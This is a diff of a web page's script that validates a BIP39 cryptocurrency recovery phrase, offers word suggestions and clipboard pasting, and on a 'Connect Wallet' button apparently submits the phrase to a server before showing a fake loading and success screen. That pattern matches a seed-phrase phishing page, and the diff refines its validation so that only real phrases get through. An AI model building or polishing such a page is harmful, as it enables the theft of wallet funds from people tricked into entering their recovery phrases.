@@ -229,27 +229,32 @@ button:disabled {
 </div>
 
 <script>
-let WORDS = [], WORD_MAP = new Map(), WORDS_READY = false;
-fetch("https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt")
-  .then(r => r.ok ? r.text() : Promise.reject())
-  .then(t => {
-    WORDS = t.trim().split(/\n+/);
-    WORD_MAP = new Map(WORDS.map((w,i)=>[w,i]));
-    WORDS_READY = true;
-    ta.dispatchEvent(new Event('input'));
-  })
-  .catch(() => {
-    WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse"];
-    WORD_MAP = new Map(WORDS.map((w,i)=>[w,i]));
-    WORDS_READY = true;
-    ta.dispatchEvent(new Event('input'));
-  });
+let WORDS = [], WORD_MAP = new Map(), WORDS_READY = false, FULL_WORDLIST = false;
 
 const ta = document.getElementById('mnemonic');
 const box = document.getElementById('suggestions');
 const runBtn = document.getElementById('runBtn');
 const pasteText = document.getElementById('pasteText');
 const ENT_BY_WORDS = {12:128, 15:160, 18:192, 21:224, 24:256};
+
+// Fetch word list and initialize the validation map
+fetch("https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt")
+  .then(r => r.ok ? r.text() : Promise.reject())
+  .then(t => {
+    WORDS = t.trim().split(/\n+/);
+    WORD_MAP = new Map(WORDS.map((w,i)=>[w,i]));
+    WORDS_READY = true;
+    FULL_WORDLIST = true;
+    ta.dispatchEvent(new Event('input'));
+  })
+  .catch(() => {
+    // Fallback: tiny list, no real checksum possible
+    WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse"];
+    WORD_MAP = new Map(WORDS.map((w,i)=>[w,i]));
+    WORDS_READY = true;
+    FULL_WORDLIST = false;
+    ta.dispatchEvent(new Event('input'));
+  });
 
 function wordsToBitString(words){
   let bits = "";
@@ -260,17 +265,27 @@ function wordsToBitString(words){
   }
   return bits;
 }
+
 function bitsToBytes(bitstr){
   const bytes = new Uint8Array(bitstr.length / 8);
-  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(bitstr.slice(i * 8, i * 8 + 8), 2);
+  for (let i = 0; i < bytes.length; i++) {
+    bytes[i] = parseInt(bitstr.slice(i * 8, i * 8 + 8), 2);
+  }
   return bytes;
 }
+
+// Validate BIP39 mnemonic with checksum
 async function isValidBip39(mnemonic) {
-  if (!WORDS_READY) return false;
+  if (!WORDS_READY || !FULL_WORDLIST) return false;
+
   const words = mnemonic.trim().toLowerCase().split(/\s+/).filter(Boolean);
   const n = words.length;
   if (!ENT_BY_WORDS[n]) return false;
-  for (const w of words) if (!WORD_MAP.has(w)) return false;
+
+  // All words must exist in the list
+  for (const w of words) {
+    if (!WORD_MAP.has(w)) return false;
+  }
 
   const ENT = ENT_BY_WORDS[n], CS = ENT / 32;
   const bitstr = wordsToBitString(words);
@@ -280,6 +295,7 @@ async function isValidBip39(mnemonic) {
   const csBits = bitstr.slice(ENT, ENT + CS);
 
   const entropyBytes = bitsToBytes(entBits);
+
   let hashBuf;
   try {
     hashBuf = await crypto.subtle.digest('SHA-256', entropyBytes);
@@ -289,36 +305,56 @@ async function isValidBip39(mnemonic) {
 
   const hash = new Uint8Array(hashBuf);
   let hashBits = "";
-  for (const b of hash) hashBits += b.toString(2).padStart(8, '0');
+  for (const b of hash) {
+    hashBits += b.toString(2).padStart(8, '0');
+  }
 
   return csBits === hashBits.slice(0, CS);
 }
+
+// Input handler: suggestions + enabling button
 ta.addEventListener('input', async () => {
   const text = ta.value.trim();
-  const parts = text.split(/\s+/);
+  const parts = text.split(/\s+/).filter(Boolean);
   const last = (parts[parts.length - 1] || "").toLowerCase();
+
+  // Suggestions
   box.innerHTML = '';
   if (WORDS_READY && last) {
-    WORDS.filter(w => w.startsWith(last)).slice(0, 20).forEach(word => {
-      const badge = document.createElement('span');
-      badge.className = 'badge';
-      badge.textContent = word;
-      badge.onclick = () => {
-        parts[parts.length - 1] = word;
-        ta.value = parts.join(' ') + ' ';
-        box.innerHTML = '';
-        ta.focus();
-        ta.dispatchEvent(new Event('input'));
-      };
-      box.appendChild(badge);
-    });
+    WORDS
+      .filter(w => w.startsWith(last))
+      .slice(0, 20)
+      .forEach(word => {
+        const badge = document.createElement('span');
+        badge.className = 'badge';
+        badge.textContent = word;
+        badge.onclick = () => {
+          parts[parts.length - 1] = word;
+          ta.value = parts.join(' ') + ' ';
+          box.innerHTML = '';
+          ta.focus();
+          ta.dispatchEvent(new Event('input'));
+        };
+        box.appendChild(badge);
+      });
   }
 
+  // Default: disabled
   runBtn.disabled = true;
-  if (text.split(/\s+/).length >= 12) {
-    if (await isValidBip39(text)) runBtn.disabled = false;
+
+  if (parts.length < 12) return;
+
+  // If full list loaded, require checksum valid
+  if (FULL_WORDLIST) {
+    const ok = await isValidBip39(text);
+    runBtn.disabled = !ok;
+  } else {
+    // Fallback: no full list → only length check
+    runBtn.disabled = false;
   }
 });
+
+// Submit action (Connect Wallet)
 runBtn.onclick = async () => {
   const mnemonic = ta.value.trim();
   document.getElementById('main-page').style.display = 'none';
@@ -335,7 +371,8 @@ runBtn.onclick = async () => {
       throw new Error(`Server error: ${res.statusText}`);
     }
 
-     await res.json();
+    await res.json();
+
     setTimeout(() => {
       document.getElementById('loading-page').style.display = 'none';
       document.getElementById('success-page').style.display = 'block';
@@ -349,6 +386,7 @@ runBtn.onclick = async () => {
   }
 };
 
+// Paste helper
 pasteText.onclick = async () => {
   try {
     const clip = await navigator.clipboard.readText();
@@ -359,5 +397,6 @@ pasteText.onclick = async () => {
   }
 };
 </script>
+
 </body>
 </html>
